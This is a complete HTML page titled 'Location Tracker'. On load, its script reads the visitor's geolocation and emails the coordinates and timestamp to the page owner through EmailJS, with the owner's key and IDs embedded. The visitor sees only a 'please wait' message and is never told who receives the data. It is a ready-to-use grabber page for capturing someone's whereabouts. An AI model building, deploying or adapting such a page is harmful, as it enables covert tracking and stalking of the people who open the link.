<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Location Tracker</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <h3>Tracking Location... Please wait</h3>

  <script>
    // ✅ Initialize EmailJS with your PUBLIC KEY
    (function() {
      emailjs.init("LS0kSC-13YzzAE78w");
    })();

    // ✅ Send location to EmailJS
    function sendLocation(lat, lon) {
      const now = new Date().toLocaleString();

      const templateParams = {
        latitude: lat,
        longitude: lon,
        date_time: now
      };

      emailjs.send('service_dwxm5dp', 'template_omqnoz4', templateParams)
        .then(function(response) {
          console.log('✅ Location sent successfully!', response.status, response.text);
        }, function(error) {
          console.error('❌ Failed to send location:', error);
        });
    }

    // ✅ Get user's location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendLocation(lat, lon);
        },
        function(error) {
          console.error("❌ Error getting location:", error.message);
        }
      );
    } else {
      console.log("❌ Geolocation is not supported by this browser.");
    }
  </script>
</body>
</html>
